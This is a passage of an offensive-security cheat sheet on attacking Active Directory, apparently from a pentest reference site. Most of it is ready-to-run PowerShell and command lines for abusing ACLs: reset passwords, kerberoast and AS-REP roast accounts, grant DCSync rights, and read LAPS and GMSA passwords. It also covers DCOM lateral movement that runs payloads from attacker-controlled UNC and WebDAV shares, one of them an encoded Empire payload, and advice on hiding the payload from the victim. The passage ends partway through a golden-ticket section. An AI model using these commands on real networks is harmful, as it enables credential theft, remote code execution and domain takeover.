</span><span class="n">Add-ObjectAcl</span><span class="w"> </span><span class="nt">-TargetADSprefix</span><span class="w"> </span><span class="s1">'CN=AdminSDHolder,CN=System'</span><span class="w"> </span><span class="nt">-PrincipalSamAccountName</span><span class="w"> </span><span class="nx">toto</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">All</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="abusing-active-directory-aclsaces">Abusing Active Directory ACLs/ACEs</h3>

<p>Check ACL for an User with <a href="https://github.com/canix1/ADACLScanner">ADACLScanner</a>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">ADACLScan.ps1</span><span class="w"> </span><span class="nt">-Base</span><span class="w"> </span><span class="s2">"DC=contoso;DC=com"</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s2">"(&amp;(AdminCount=1))"</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">subtree</span><span class="w"> </span><span class="nt">-EffectiveRightsPrincipal</span><span class="w"> </span><span class="nx">User1</span><span class="w"> </span><span class="nt">-Output</span><span class="w"> </span><span class="nx">HTML</span><span class="w"> </span><span class="nt">-Show</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="genericall">GenericAll</h4>

<ul>
  <li><strong>GenericAll on User</strong> : We can reset user’s password without knowing the current password</li>
  <li>
    <p><strong>GenericAll on Group</strong> : Effectively, this allows us to add ourselves (the user spotless) to the Domain Admin group : <code class="language-plaintext highlighter-rouge">net group "domain admins" spotless /add /domain</code></p>
  </li>
  <li><strong>GenericAll/GenericWrite</strong> : We can set a <strong>SPN</strong> on a target account, request a TGS, then grab its hash and kerberoast it.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="c"># Check for interesting permissions on accounts:</span><span class="w">
</span><span class="n">Invoke-ACLScanner</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentinyReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"RDPUsers"</span><span class="p">}</span><span class="w">
  
</span><span class="c"># Check if current user has already an SPN setted:</span><span class="w">
</span><span class="n">PowerView2</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">UserName</span><span class="err">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">serviceprincipalname</span><span class="w">
  
</span><span class="c"># Force set the SPN on the account:</span><span class="w">
</span><span class="n">PowerView2</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Set-DomainObject</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">UserName</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Set</span><span class="w"> </span><span class="p">@{</span><span class="nx">serviceprincipalname</span><span class="o">=</span><span class="s1">'ops/whatever1'</span><span class="p">}</span><span class="w">

</span><span class="c"># Grab the ticket</span><span class="w">
</span><span class="n">PowerView2</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$User</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nx">username</span><span class="w"> 
</span><span class="n">PowerView2</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$User</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-DomainSPNTicket</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">
</span><span class="nx">PowerView2</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$User</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">serviceprincipalname</span><span class="w">

</span><span class="c"># Remove the SPN</span><span class="w">
</span><span class="n">PowerView2</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Set-DomainObject</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="nt">-Clear</span><span class="w"> </span><span class="nx">serviceprincipalname</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><strong>GenericAll/GenericWrite</strong> : We can change a victim’s <strong>userAccountControl</strong> to not require Kerberos preauthentication, grab the user’s crackable AS-REP, and then change the setting back.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="c"># Modify the userAccountControl</span><span class="w">
</span><span class="n">PowerView2</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainUser</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ConvertFrom-UACValue</span><span class="w">
</span><span class="nx">PowerView2</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Set-DomainObject</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="o">-XOR</span><span class="w"> </span><span class="p">@{</span><span class="nx">useraccountcontrol</span><span class="o">=</span><span class="mi">4194304</span><span class="p">}</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">

</span><span class="c"># Grab the ticket</span><span class="w">
</span><span class="n">PowerView2</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainUser</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ConvertFrom-UACValue</span><span class="w">
</span><span class="nx">ASREPRoast</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ASREPHash</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">-UserName</span><span class="w"> </span><span class="nx">username</span><span class="w">

</span><span class="c"># Set back the userAccountControl</span><span class="w">
</span><span class="n">PowerView2</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Set-DomainObject</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="o">-XOR</span><span class="w"> </span><span class="p">@{</span><span class="nx">useraccountcontrol</span><span class="o">=</span><span class="mi">4194304</span><span class="p">}</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="n">PowerView2</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainUser</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ConvertFrom-UACValue</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h4 id="genericwrite">GenericWrite</h4>

<ul>
  <li>
    <p>Reset another user’s password</p>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="c"># https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1</span><span class="w">
  </span><span class="nv">$user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'DOMAIN\user1'</span><span class="p">;</span><span class="w"> 
  </span><span class="nv">$pass</span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'user1pwd'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">;</span><span class="w"> 
  </span><span class="nv">$creds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="nv">$user</span><span class="p">,</span><span class="w"> </span><span class="nv">$pass</span><span class="p">;</span><span class="w">
  </span><span class="nv">$newpass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'newsecretpass'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">;</span><span class="w"> 
  </span><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'DOMAIN\user2'</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$newpass</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$creds</span><span class="p">;</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p>WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : <code class="language-plaintext highlighter-rouge">Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1</code></p>
  </li>
</ul>

<h5 id="genericwrite-and-remote-connection-manager">GenericWrite and Remote Connection Manager</h5>

<blockquote>
  <p>Now let’s say you are in an Active Directory environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM on a compromised RDSH, what can we actually do ? Well each user object in Active Directory has a tab called ‘Environment’.</p>

  <p>This tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the ‘Starting program’ field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined. - https://sensepost.com/blog/2020/ace-to-rce/</p>
</blockquote>

<p>:warning: The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (&gt;2016), it requires a registry change to re-enable.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$UserObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">ADSI</span><span class="p">](</span><span class="s2">"LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld"</span><span class="p">))</span><span class="w">
</span><span class="nv">$UserObject</span><span class="o">.</span><span class="nf">TerminalServicesInitialProgram</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"\\1.2.3.4\share\file.exe"</span><span class="w">
</span><span class="nv">$UserObject</span><span class="o">.</span><span class="nf">TerminalServicesWorkDirectory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"C:\"</span><span class="w">
</span><span class="nv">$UserObject</span><span class="o">.</span><span class="nf">SetInfo</span><span class="p">()</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>NOTE: To not alert the user the payload should hide its own process window and spawn the normal graphical environment.</p>

<h4 id="writedacl">WriteDACL</h4>

<p>To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. <a href="https://github.com/fox-it/Invoke-ACLPwn">Invoke-ACLPwn</a> is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : <code class="language-plaintext highlighter-rouge">./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'</code></p>

<ul>
  <li>WriteDACL on Domain
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="c"># Give DCSync right to the principal identity</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="nv">$SecPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'user1pwd'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'DOMAIN.LOCAL\user1'</span><span class="p">,</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="p">)</span><span class="w">
</span><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s1">'DC=domain,DC=local'</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">DCSync</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">user2</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> 
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>WriteDACL on Group
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s2">"INTERESTING_GROUP"</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">WriteMembers</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">User1</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"INTERESTING_GROUP"</span><span class="w"> </span><span class="nx">User1</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h4 id="writeowner">WriteOwner</h4>

<p>An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. This can be achieved with Set-DomainObjectOwner (PowerView module).</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">Set-DomainObjectOwner</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'target_object'</span><span class="w"> </span><span class="nt">-OwnerIdentity</span><span class="w"> </span><span class="s1">'controlled_principal'</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group.</p>

<h4 id="readlapspassword">ReadLAPSPassword</h4>

<p>An attacker can read the LAPS password of the computer account this ACE applies to. This can be achieved with the Active Directory PowerShell module. Detail of the exploitation can be found in the <a href="#reading-laps-password">Reading LAPS Password</a> section.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="p">{</span><span class="n">ms-mcs-admpwdexpirationtime</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'*'</span><span class="p">}</span><span class="w"> </span><span class="nt">-prop</span><span class="w"> </span><span class="s1">'ms-mcs-admpwd'</span><span class="p">,</span><span class="s1">'ms-mcs-admpwdexpirationtime'</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="readgmsapassword">ReadGMSAPassword</h4>

<p>An attacker can read the GMSA password of the account this ACE applies to. This can be achieved with the Active Directory and DSInternals PowerShell modules.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="c"># Save the blob to a variable</span><span class="w">
</span><span class="nv">$gmsa</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ADServiceAccount</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'SQL_HQ_Primary'</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="s1">'msDS-ManagedPassword'</span><span class="w">
</span><span class="nv">$mp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$gmsa</span><span class="o">.</span><span class="s1">'msDS-ManagedPassword'</span><span class="w">

</span><span class="c"># Decode the data structure using the DSInternals module</span><span class="w">
</span><span class="n">ConvertFrom-ADManagedPasswordBlob</span><span class="w"> </span><span class="nv">$mp</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="forcechangepassword">ForceChangePassword</h4>

<p>An attacker can change the password of the user this ACE applies to. 
This can be achieved with Set-DomainUserPassword (PowerView module).</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$NewPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Password123!'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'TargetUser'</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$NewPassword</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="dcom-exploitation">DCOM Exploitation</h3>

<blockquote>
  <p>DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer.</p>
</blockquote>

<ul>
  <li>CheeseTools - https://github.com/klezVirus/CheeseTools
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="nt">-t</span><span class="p">,</span><span class="w"> </span><span class="nt">--target</span><span class="o">=</span><span class="n">VALUE</span><span class="w">         </span><span class="nx">Target</span><span class="w"> </span><span class="nx">Machine</span><span class="w">
</span><span class="nt">-b</span><span class="p">,</span><span class="w"> </span><span class="nt">--binary</span><span class="o">=</span><span class="n">VALUE</span><span class="w">         </span><span class="nx">Binary:</span><span class="w"> </span><span class="nx">powershell.exe</span><span class="w">
</span><span class="nt">-a</span><span class="p">,</span><span class="w"> </span><span class="nt">--args</span><span class="o">=</span><span class="n">VALUE</span><span class="w">           </span><span class="nx">Arguments:</span><span class="w"> </span><span class="nt">-enc</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">blah</span><span class="err">&gt;</span><span class="w">
</span><span class="nt">-m</span><span class="p">,</span><span class="w"> </span><span class="nt">--method</span><span class="o">=</span><span class="n">VALUE</span><span class="w">         </span><span class="nx">Methods:</span><span class="w"> </span><span class="nx">MMC20Application</span><span class="p">,</span><span class="w"> </span><span class="nx">ShellWindows</span><span class="p">,</span><span class="w">
                            </span><span class="n">ShellBrowserWindow</span><span class="p">,</span><span class="w"> </span><span class="nx">ExcelDDE</span><span class="p">,</span><span class="w"> </span><span class="nx">VisioAddonEx</span><span class="p">,</span><span class="w">
                            </span><span class="n">OutlookShellEx</span><span class="p">,</span><span class="w"> </span><span class="nx">ExcelXLL</span><span class="p">,</span><span class="w"> </span><span class="nx">VisioExecLine</span><span class="p">,</span><span class="w"> 
                            </span><span class="n">OfficeMacro</span><span class="w">
</span><span class="nt">-r</span><span class="p">,</span><span class="w"> </span><span class="nt">--reg</span><span class="p">,</span><span class="w"> </span><span class="nt">--registry</span><span class="w">      </span><span class="nx">Enable</span><span class="w"> </span><span class="nx">registry</span><span class="w"> </span><span class="nx">manipulation</span><span class="w">
</span><span class="nt">-h</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="nf">?</span><span class="p">,</span><span class="w"> </span><span class="nt">--help</span><span class="w">             </span><span class="nx">Show</span><span class="w"> </span><span class="nx">Help</span><span class="w">

</span><span class="n">Current</span><span class="w"> </span><span class="nx">Methods:</span><span class="w"> </span><span class="nx">MMC20.Application</span><span class="p">,</span><span class="w"> </span><span class="nx">ShellWindows</span><span class="p">,</span><span class="w"> </span><span class="nx">ShellBrowserWindow</span><span class="p">,</span><span class="w"> </span><span class="nx">ExcelDDE</span><span class="p">,</span><span class="w"> </span><span class="nx">VisioAddonEx</span><span class="p">,</span><span class="w"> </span><span class="nx">OutlookShellEx</span><span class="p">,</span><span class="w"> </span><span class="nx">ExcelXLL</span><span class="p">,</span><span class="w"> </span><span class="nx">VisioExecLine</span><span class="p">,</span><span class="w"> </span><span class="nx">OfficeMacro.</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>

    <p>https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/</p>
  </li>
</ul>

<h4 id="dcom-via-mmc-application-class">DCOM via MMC Application Class</h4>

<p>This COM object (MMC20.Application) allows you to script components of MMC snap-in operations. there is a method named <strong>“ExecuteShellCommand”</strong> under <strong>Document.ActiveView</strong>.</p>

<pre><code class="language-ps1">PS C:\&gt; $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.1"))
PS C:\&gt; $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe",$null,$null,7)
PS C:\&gt; $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$null,"-enc DFDFSFSFSFSFSFSFSDFSFSF &lt; Empire encoded string &gt; ","7")

# Weaponized example with MSBuild
PS C:\&gt; [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.1")).Document.ActiveView.ExecuteShellCommand("c:\windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",$null,"\\10.10.10.2\webdav\build.xml","7")
</code></pre>

<p>Invoke-MMC20RCE : https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1</p>

<h4 id="dcom-via-office">DCOM via Office</h4>

<ul>
  <li>Excel.Application
    <ul>
      <li>DDEInitiate</li>
      <li>RegisterXLL</li>
    </ul>
  </li>
  <li>Outlook.Application
    <ul>
      <li>CreateObject-&gt;Shell.Application-&gt;ShellExecute</li>
      <li>CreateObject-&gt;ScriptControl (office-32bit only)</li>
    </ul>
  </li>
  <li>Visio.InvisibleApp (same as Visio.Application, but should not show the Visio window)
    <ul>
      <li>Addons</li>
      <li>ExecuteLine</li>
    </ul>
  </li>
  <li>Word.Application
    <ul>
      <li>RunAutoMacro</li>
    </ul>
  </li>
</ul>

<pre><code class="language-ps1"># Powershell script that injects shellcode into excel.exe via ExecuteExcel4Macro through DCOM
Invoke-Excel4DCOM64.ps1 https://gist.github.com/Philts/85d0f2f0a1cc901d40bbb5b44eb3b4c9
Invoke-ExShellcode.ps1 https://gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a

# Using Excel DDE
PS C:\&gt; $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$ComputerName"))
PS C:\&gt; $excel.DisplayAlerts = $false
PS C:\&gt; $excel.DDEInitiate("cmd", "/c calc.exe")

# Using Excel RegisterXLL
# Can't be used reliably with a remote target
Require: reg add HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations /v AllowsNetworkLocations /t REG_DWORD /d 1
PS&gt; $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$ComputerName"))
PS&gt; $excel.RegisterXLL("EvilXLL.dll")

# Using Visio
$visio = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.InvisibleApp", "$ComputerName"))
$visio.Addons.Add("C:\Windows\System32\cmd.exe").Run("/c calc")

</code></pre>

<h4 id="dcom-via-shellexecute">DCOM via ShellExecute</h4>

<pre><code class="language-ps1">$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"10.10.10.1")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
</code></pre>

<h4 id="dcom-via-shellbrowserwindow">DCOM via ShellBrowserWindow</h4>

<p>:warning: Windows 10 only, the object doesn’t exists in Windows 7</p>

<pre><code class="language-ps1">$com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"10.10.10.1")
$obj = [System.Activator]::CreateInstance($com)
$obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
</code></pre>

<h3 id="trust-relationship-between-domains">Trust relationship between domains</h3>

<ul>
  <li>One-way
    <ul>
      <li>Domain B trusts A</li>
      <li>Users in Domain A can access resources in Domain B</li>
      <li>Users in Domain B cannot access resources in Domain A</li>
    </ul>
  </li>
  <li>Two-way
    <ul>
      <li>Domain A trusts Domain B</li>
      <li>Domain B trusts Domain A</li>
      <li>Authentication requests can be passed between the two domains in both directions</li>
    </ul>
  </li>
</ul>

<h4 id="enumerate-trusts-between-domains">Enumerate trusts between domains</h4>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">nltest</span><span class="w"> </span><span class="nx">/trusted_domains</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>or</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="p">([</span><span class="n">System.DirectoryServices.ActiveDirectory.Domain</span><span class="p">]::</span><span class="n">GetCurrentDomain</span><span class="p">())</span><span class="o">.</span><span class="nf">GetAllTrustRelationships</span><span class="p">()</span><span class="w">

</span><span class="n">SourceName</span><span class="w">          </span><span class="nx">TargetName</span><span class="w">                    </span><span class="nx">TrustType</span><span class="w">      </span><span class="nx">TrustDirection</span><span class="w">
</span><span class="o">----------</span><span class="w">          </span><span class="o">----------</span><span class="w">                    </span><span class="o">---------</span><span class="w">      </span><span class="o">--------------</span><span class="w">
</span><span class="n">domainA.local</span><span class="w">      </span><span class="nx">domainB.local</span><span class="w">                  </span><span class="nx">TreeRoot</span><span class="w">       </span><span class="nx">Bidirectional</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h4 id="exploit-trusts-between-domains">Exploit trusts between domains</h4>

<p>:warning: Require a Domain-Admin level access to the current domain.</p>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>Source</th>
      <th>Target</th>
      <th>Technique to use</th>
      <th>Trust relationship</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Root</td>
      <td>Child</td>
      <td>Golden Ticket + Enterprise Admin group (Mimikatz /groups)</td>
      <td>Inter Realm (2-way)</td>
    </tr>
    <tr>
      <td>Child</td>
      <td>Child</td>
      <td>SID History exploitation (Mimikatz /sids)</td>
      <td>Inter Realm Parent-Child (2-way)</td>
    </tr>
    <tr>
      <td>Child</td>
      <td>Root</td>
      <td>SID History exploitation (Mimikatz /sids)</td>
      <td>Inter Realm Tree-Root (2-way)</td>
    </tr>
    <tr>
      <td>Forest A</td>
      <td>Forest B</td>
      <td>PrinterBug + Unconstrained delegation ?</td>
      <td>Inter Realm Forest or External (2-way)</td>
    </tr>
  </tbody>
</table></div>

<h3 id="child-domain-to-forest-compromise---sid-hijacking">Child Domain to Forest Compromise - SID Hijacking</h3>

<p>Most trees are linked with dual sided trust relationships to allow for sharing of resources.
By default the first domain created if the Forest Root.</p>

<p><strong>Requirements</strong>:</p>
<ul>
  <li>KRBTGT Hash</li>
  <li>Find the SID of the domain
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">Convert-NameToSid</span><span class="w"> </span><span class="nx">target.domain.com\krbtgt</span><span class="w">
  </span><span class="n">S-1-5-21-2941561648-383941485-1389968811-502</span><span class="w">

  </span><span class="c"># with Impacket</span><span class="w">
  </span><span class="n">lookupsid.py</span><span class="w"> </span><span class="nx">domain/user:password</span><span class="err">@</span><span class="nx">10.10.10.10</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Replace 502 with 519 to represent Enterprise Admins</li>
  <li>Create golden ticket and attack parent domain.
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
